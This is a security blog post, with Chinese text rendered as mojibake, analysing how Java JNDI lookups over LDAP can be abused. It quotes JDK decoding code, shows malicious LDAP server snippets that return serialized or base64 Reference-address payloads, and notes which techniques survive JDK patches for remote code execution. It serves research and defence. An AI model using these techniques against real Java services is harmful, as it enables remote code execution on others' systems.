<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>ã€notesã€‘JNDI with LDAP | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 å‰è¨€JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD">
<meta name="keywords" content="vul">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€notesã€‘JNDI with LDAP">
<meta property="og:url" content="http://blog.0kami.cn/2020/03/01/java/jndi-with-ldap/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="0x00 å‰è¨€JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-ldap-20200301/image-20200301142213589.png">
<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-ldap-20200301/image-20200301144715061.png">
<meta property="og:updated_time" content="2020-11-18T14:29:38.735Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€notesã€‘JNDI with LDAP">
<meta name="twitter:description" content="0x00 å‰è¨€JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD">
<meta name="twitter:image" content="http://blog.0kami.cn/images/jndi-with-ldap-20200301/image-20200301142213589.png">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-java/jndi-with-ldap"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2020/03/01/java/jndi-with-ldap/">
    	ã€notesã€‘JNDI with LDAP
    </a>
  </h2>
	<time>
	  Mar 1, 2020
	</time>
	
    
    <div class='cats'>
        <a href="/categories/notes/">notes</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">0x00 å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-LDAPåŸºç¡€"><span class="toc-number">2.</span> <span class="toc-text">0x01 LDAPåŸºç¡€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-LDAP-with-JDNI-References"><span class="toc-number">3.</span> <span class="toc-text">0x02 LDAP with JDNI References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-LDAP-with-Serialized-Object"><span class="toc-number">4.</span> <span class="toc-text">0x03 LDAP with Serialized Object</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¬¬ä¸€å¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeObject"><span class="toc-number">4.0.1.</span> <span class="toc-text">ç¬¬ä¸€å¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¬¬äºŒå¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeReference"><span class="toc-number">4.0.2.</span> <span class="toc-text">ç¬¬äºŒå¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeReference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-åç»­"><span class="toc-number">5.</span> <span class="toc-text">0x04 åç»­</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-æ€»ç»“"><span class="toc-number">6.</span> <span class="toc-text">0x05 æ€»ç»“</span></a></li></ol></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD</p>
<a id="more"></a>
<h2 id="0x01-LDAPåŸºç¡€"><a href="#0x01-LDAPåŸºç¡€" class="headerlink" title="0x01 LDAPåŸºç¡€"></a>0x01 LDAPåŸºç¡€</h2><p>å…³äºLDAPçš„ä»‹ç»ï¼Œå»¶ä¼¸é˜…è¯»ä¸€ä¸‹<a href="https://www.cnblogs.com/wilburxu/p/9174353.html" target="_blank" rel="noopener">è¿™ç¯‡</a></p>
<blockquote>
<p>LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:</p>
<p>â— Using Java serialization<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html</a><br>â— Using JNDI References<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</a></p>
<p>from <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
</blockquote>
<p>Javaä¸­çš„LDAPå¯ä»¥åœ¨å±æ€§å€¼ä¸­å­˜å‚¨ç›¸å…³çš„Javaå¯¹è±¡ï¼Œå¯ä»¥å­˜å‚¨å¦‚ä¸Šä¸¤ç§å¯¹è±¡ï¼Œè€Œç›¸å…³çš„é—®é¢˜å°±æ˜¯å‡ºç°åœ¨è¿™éƒ¨åˆ†ä¸Šã€‚</p>
<p>åæ–‡ç”¨çš„LDAP Serverå‚è€ƒçš„æ˜¯<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">mbechler å®ç°çš„LDAPRefServer</a>ï¼Œè¿æ¥çš„å®¢æˆ·ç«¯Clientç›´æ¥ç”¨JNDIçš„lookupå®Œæˆï¼Œjdkç‰ˆæœ¬jdk8u162</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"ldap://127.0.0.1:1389/EvilObj"</span>);</span><br><span class="line">ctx.close();</span><br></pre></td></tr></table></figure>
<h2 id="0x02-LDAP-with-JDNI-References"><a href="#0x02-LDAP-with-JDNI-References" class="headerlink" title="0x02 LDAP with JDNI References"></a>0x02 LDAP with JDNI References</h2><p>JNDIå‘èµ·ldapçš„lookupåï¼Œå°†æœ‰å¦‚ä¸‹çš„è°ƒç”¨æµç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æ¥å…³æ³¨ï¼Œè·å¾—è¿œç¨‹LDAP Serverçš„Entryä¹‹åï¼ŒClientè¿™è¾¹æ˜¯æ€ä¹ˆåšå¤„ç†çš„</p>
<p><img src="/images/jndi-with-ldap-20200301/image-20200301142213589.png" alt="image-20200301142213589"></p>
<p>è·Ÿè¿›com/sun/jndi/ldap/Obj.java#decodeObjectï¼ŒæŒ‰ç…§è¯¥å‡½æ•°çš„æ³¨é‡Šæ¥çœ‹ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯è§£ç ä»LDAP Serveræ¥çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯èƒ½æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªReferenceå¯¹è±¡ã€‚å…³äºåºåˆ—åŒ–å¯¹è±¡çš„å¤„ç†ï¼Œæˆ‘ä»¬çœ‹åé¢ä¸€èŠ‚ã€‚è¿™é‡Œæ‘˜å–äº†Referenceçš„å¤„ç†æ–¹å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Object <span class="title">decodeObject</span><span class="params">(Attributes attrs)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    Attribute attr;</span><br><span class="line">    <span class="comment">// Get codebase, which is used in all 3 cases.</span></span><br><span class="line">    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);<span class="comment">// "objectClass"</span></span><br><span class="line">        <span class="keyword">if</span> (attr != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || <span class="comment">// "javaNamingReference"</span></span><br><span class="line">                attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; <span class="comment">// "javanamingreference"</span></span><br><span class="line">            <span class="keyword">return</span> decodeReference(attrs, codebases);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœLDAP Serverè¿”å›çš„å±æ€§é‡ŒåŒ…æ‹¬äº†<code>objectClass</code>å’Œ<code>javaNamingReference</code>ï¼Œå°†è¿›å…¥Referenceçš„å¤„ç†å‡½æ•°decodeReferenceä¸Š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    className = (String)attr.get();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +</span><br><span class="line">                <span class="string">" attribute is required"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    factory = (String)attr.get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Reference ref = <span class="keyword">new</span> Reference(className, factory,</span><br><span class="line">    (codebases != <span class="keyword">null</span>? codebases[<span class="number">0</span>] : <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure>
<p>decodeReferenceå†ä»å±æ€§ä¸­æå–å‡º<code>javaClassName</code>å’Œ<code>javaFactory</code>ï¼Œæœ€åå°†ç”Ÿæˆä¸€ä¸ªReferenceã€‚è¿™é‡Œå¦‚æœçœ‹è¿‡æˆ‘å‰é¢çš„é‚£ç¯‡<a href="http://blog.0kami.cn/2020/02/09/jndi-with-rmi/">jndi-with-rmi</a>ï¼Œå¯ä»¥çœ‹åˆ°å…¶å®è¿™é‡Œç”Ÿæˆçš„refå°±æ˜¯æˆ‘ä»¬åœ¨RMIè¿”å›çš„é‚£ä¸ªReferenceWrapperï¼Œåé¢è¿™ä¸ªrefå°†ä¼šä¼ é€’ç»™Naming Managerå»å¤„ç†ï¼ŒåŒ…æ‹¬ä»codebaseä¸­è·å–classæ–‡ä»¶å¹¶è½½å…¥ã€‚</p>
<p>è€Œè¿™é‡ŒLDAPä¹Ÿç±»ä¼¼ï¼Œå¤„ç†refçš„å¯¹è±¡æ˜¯NamingManagerçš„å­ç±»javax/naming/spi/DirectoryManager.javaï¼Œå› ä¸ºè·ŸRMIæœ‰ç‚¹ç±»ä¼¼ä¸å…·ä½“åˆ†æäº†ï¼Œæœ€ååŒæ ·ç”±javax/naming/spi/NamingManager.java#getObjectFactoryFromReferenceæ¥å¤„ç†ã€‚</p>
<p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¥çœ‹mbechler å®ç°çš„LDAPRefServerå°±æ¯”è¾ƒæ¸…æ¥šäº†</p>
<p><img src="/images/jndi-with-ldap-20200301/image-20200301144715061.png" alt="image-20200301144715061"></p>
<p>å½“å…¶è·å–åˆ°LDAPè¿æ¥æ—¶ï¼Œå°†å¡«å……å¦‚ä¸Šçš„å‡ ä¸ªå±æ€§åŠå…¶å¯¹åº”çš„å€¼ï¼Œå°±æ˜¯ä¸ºäº†æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶è€Œç”Ÿæˆä¸€ä¸ªReferenceå¯¹è±¡ã€‚</p>
<h2 id="0x03-LDAP-with-Serialized-Object"><a href="#0x03-LDAP-with-Serialized-Object" class="headerlink" title="0x03 LDAP with Serialized Object"></a>0x03 LDAP with Serialized Object</h2><p>JNDIå¯¹äºå±æ€§ä¸­çš„åºåˆ—åŒ–æ•°æ®çš„å¤„ç†ä¸€å…±æœ‰ä¸¤ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆæ¥é¡ºç€å‰é¢çš„JNDI Referenceçš„æ€è·¯è¯´ä¸‹å»</p>
<h4 id="ç¬¬ä¸€å¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeObject"><a href="#ç¬¬ä¸€å¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeObject" class="headerlink" title="ç¬¬ä¸€å¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeObject"></a>ç¬¬ä¸€å¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeObject</h4><p>åœ¨com/sun/jndi/ldap/Obj.java#decodeObjectä¸Šè¿˜å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="keyword">null</span>) &#123;<span class="comment">// â€œjavaSerializedDataâ€</span></span><br><span class="line">    ClassLoader cl = helper.getURLClassLoader(codebases);</span><br><span class="line">    <span class="keyword">return</span> deserializeObject((<span class="keyword">byte</span>[])attr.get(), cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœåœ¨è¿”å›çš„å±æ€§ä¸­å­˜åœ¨<code>javaSerializedData</code>ï¼Œå°†ç»§ç»­è°ƒç”¨<code>deserializeObject</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è°ƒç”¨å¸¸è§„çš„ååºåˆ—åŒ–æ–¹å¼readObjectå¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œè¿˜åŸï¼Œå¦‚ä¸‹payloadã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaSerializedData"</span>, serialized);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å°±ä¸éœ€è¦é€šè¿‡è¿œç¨‹codebaseçš„æ–¹å¼æ¥è¾¾æˆRCEï¼Œå½“ç„¶é¦–å…ˆæœ¬åœ°ç¯å¢ƒä¸Šéœ€è¦æœ‰ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€ä¾èµ–çš„åº“æ–‡ä»¶ã€‚</p>
<h4 id="ç¬¬äºŒå¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeReference"><a href="#ç¬¬äºŒå¤„ï¼šcom-sun-jndi-ldap-Obj-java-decodeReference" class="headerlink" title="ç¬¬äºŒå¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeReference"></a>ç¬¬äºŒå¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeReference</h4><p><code>decodeReference</code>å‡½æ•°åœ¨å¯¹æ™®é€šçš„Referenceè¿˜åŸçš„åŸºç¡€ä¸Šï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥å¯¹RefAddressåšè¿˜åŸå¤„ç†ï¼Œå…¶ä¸­è¿˜åŸè¿‡ç¨‹ä¸­ï¼Œä¹Ÿè°ƒç”¨äº†<code>deserializeObject</code>å‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬é€šè¿‡æ»¡è¶³RefAddressçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢ç¬¬ä¸€ç§çš„æ•ˆæœã€‚</p>
<p>å…·ä½“ä»£ç å¤ªé•¿äº†ï¼Œè¿™é‡Œæˆ‘å°±è¯´ä¸€ä¸‹æ¡ä»¶ï¼š</p>
<ol>
<li>ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºåˆ†éš”ç¬¦</li>
<li>ç¬¬ä¸€ä¸ªåˆ†éš”ç¬¦ä¸ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºReferenceçš„positionï¼Œä¸ºintç±»å‹</li>
<li>ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¸ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºtypeï¼Œç±»å‹</li>
<li>ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦æ˜¯åŒåˆ†éš”ç¬¦çš„å½¢å¼ï¼Œåˆ™è¿›å…¥ååºåˆ—åŒ–çš„æ“ä½œ</li>
<li>åºåˆ—åŒ–æ•°æ®ç”¨base64ç¼–ç </li>
</ol>
<p>æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œæ„é€ ä¸€ä¸ªç±»ä¼¼çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaReferenceAddress"</span>,<span class="string">"$1$String$$"</span>+<span class="keyword">new</span> BASE64Encoder().encode(serialized));</span><br><span class="line">  entry.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ç¬¬äºŒå¤„åªæ˜¯ä¸€ä¸ªé”¦ä¸Šæ·»èŠ±çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œç¬¬äºŒç§åœ¨ç¬¬ä¸€ç§ä¸èƒ½ç”¨çš„æƒ…å†µä¸‹å¯ä»¥è¯•è¯•ã€‚</p>
<h2 id="0x04-åç»­"><a href="#0x04-åç»­" class="headerlink" title="0x04 åç»­"></a>0x04 åç»­</h2><p>è‡ª<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33" target="_blank" rel="noopener">jdk8u191-b02</a>ç‰ˆæœ¬åï¼Œæ–°æ·»åŠ äº†<code>com.sun.jndi.ldap.object.trustURLCodebase</code>é»˜è®¤ä¸ºfalseçš„é™åˆ¶ï¼Œä¹Ÿå°±æ„å‘³ç€è¿œç¨‹codebaseçš„Referenceæ–¹å¼è¢«é™åˆ¶æ­»äº†ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡SerializedDataçš„æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚</p>
<p>æˆ‘ä»¬æ¥æ•´ç†ä¸€ä¸‹ï¼Œå…³äºjndiçš„ç›¸å…³å®‰å…¨æ›´æ–°</p>
<ul>
<li><p>JDK 6u132, JDK 7u122, JDK 8u113ä¸­æ·»åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseã€‚</p>
<p><strong>å¯¼è‡´jndiçš„rmi referenceæ–¹å¼å¤±æ•ˆï¼Œä½†ldapçš„referenceæ–¹å¼ä»ç„¶å¯è¡Œ</strong></p>
</li>
<li><p>Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å <code>com.sun.jndi.ldap.object.trustURLCodebase</code>å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseã€‚</p>
<p><strong>å¯¼è‡´jndiçš„ldap referenceæ–¹å¼å¤±æ•ˆï¼Œåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œè¿œç¨‹codebaseçš„æ–¹å¼åŸºæœ¬å¤±æ•ˆï¼Œé™¤éè®¤ä¸ºè®¾ä¸ºtrue</strong></p>
</li>
</ul>
<p>è€Œåœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸Šï¼Œjndi ldapçš„æœ¬åœ°ååºåˆ—åŒ–åˆ©ç”¨é“¾<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l239" target="_blank" rel="noopener">1</a>å’Œ<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l478" target="_blank" rel="noopener">2</a>çš„æ–¹å¼ä»ç„¶æœªå¤±æ•ˆï¼Œjndi rmiåº•å±‚(JRMPListener)<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/sun/rmi/transport/StreamRemoteCall.java#l270" target="_blank" rel="noopener">StreamRemoteCall</a>çš„æœ¬åœ°åˆ©ç”¨æ–¹å¼ä»æœªå¤±æ•ˆã€‚</p>
<p>æ‰€ä»¥å¦‚æœReferenceçš„æ–¹å¼ä¸è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ¥è¾¾æˆRCEã€‚</p>
<h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>JNDIå’ŒLDAPçš„ç»“åˆï¼Œå‡ºç°äº†2ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€æ˜¯åˆ©ç”¨è¿œç¨‹codebaseçš„æ–¹å¼ï¼ŒäºŒæ˜¯åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚åœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸­ï¼Œcodebaseçš„æ–¹å¼ä¾èµ–<code>com.sun.jndi.ldap.object.trustURLCodebase</code>çš„å€¼ï¼Œè€Œç¬¬äºŒç§æ–¹å¼ä»æœªå¤±æ•ˆã€‚</p>
<p>LDAPçš„ä½¿ç”¨æ–¹æ³•é™¤äº†JNDIçš„lookupï¼Œå…¶ä»–çš„åº“ä¹Ÿä¼šæœ‰ç›¸åº”çš„ä½¿ç”¨æ–¹æ³•ï¼Œå¦‚Springçš„ldapï¼Œè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­æ·±å…¥ä¸‹å»ï¼Œå…ˆæŒ–ä¸ªå‘XD</p>
<p>æœ€åï¼Œä¸Šé¢çš„ä¸¤ä¸ªldap Serveræ›´æ–°åˆ°äº†<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">github</a>ä¸Šï¼Œè‡ªå–XD</p>

  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/vul/">vul</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prevï¼š<a href="/2020/03/10/java/java-jmx-rmi/" rel="prev"  title="ã€notesã€‘æ”»å‡»Java JMX-RMI">
						ã€notesã€‘æ”»å‡»Java JMX-RMI
					</a></span>
				
				
					<span class="art-item-right">nextï¼š<a href="/2020/02/09/java/jndi-with-rmi/" rel="next"  title="ã€notesã€‘JNDI with RMI">
						ã€notesã€‘JNDI with RMI
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: 'ã€notesã€‘JNDI with LDAP',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
